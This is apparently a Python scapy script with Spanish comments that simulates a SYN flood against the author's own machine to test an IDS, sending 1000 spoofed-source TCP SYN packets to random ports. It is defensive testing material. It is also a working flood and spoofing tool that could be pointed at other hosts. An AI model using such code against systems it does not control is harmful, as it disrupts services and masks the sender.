from scapy.all import Ether, IP, TCP, sendp, get_if_hwaddr, conf
import random
import time

# =============================================================================
# Simulador de ataque SYN Flood para pruebas del IDS UNIPAZ
# Usa Layer 2 (sendp) para que los paquetes sean visibles al sniffer en Windows
# =============================================================================

# Detectar interfaz y MAC local
iface = conf.iface
try:
    mi_mac = get_if_hwaddr(iface)
    print(f"Interfaz: {iface}")
    print(f"MAC local: {mi_mac}")
except Exception:
    mi_mac = "ff:ff:ff:ff:ff:ff"
    print(f"No se pudo detectar MAC, usando broadcast")

# IP destino (tu maquina - la que el IDS monitorea)
target_ip = "172.10.14.181"

# IP falsa del "atacante" (IP reservada para documentacion RFC 5737)
attacker_ip = "203.0.113.50"

print()
print(f"=== SIMULACION DE ATAQUE SYN FLOOD ===")
print(f"Atacante (spoofed): {attacker_ip}")
print(f"Victima:            {target_ip}")
print(f"Paquetes a enviar:  1000")
print(f"Metodo:             Layer 2 (sendp) con Npcap")
print()

try:
    # Construir paquetes con capa Ethernet para Layer 2
    # dst=mi_mac: el paquete va dirigido a nuestra propia MAC
    # src se genera automaticamente
    paquetes = []
    for i in range(1000):
        dport = random.randint(1, 65535)
        pkt = Ether(dst=mi_mac)/IP(src=attacker_ip, dst=target_ip)/TCP(dport=dport, flags="S")
        paquetes.append(pkt)

    print("Enviando paquetes...")
    # Enviar en lotes para maxima velocidad
    for i in range(0, len(paquetes), 100):
        lote = paquetes[i:i+100]
        sendp(lote, iface=iface, verbose=False)
        enviados = min(i + 100, len(paquetes))
        print(f"  [{enviados}/1000] paquetes enviados")

    print()
    print("=== SIMULACION COMPLETADA ===")
    print("Revisa la interfaz del IDS:")
    print("  1. Eventos Detectados: SYN Flood + Escaneo de Puertos")
    print("  2. Grafico: Distribucion de ataques")
    print("  3. Respuesta Activa IPS: IP 203.0.113.50 bloqueada")
except Exception as e:
    print(f"Error: {e}")
    import traceback
    traceback.print_exc()
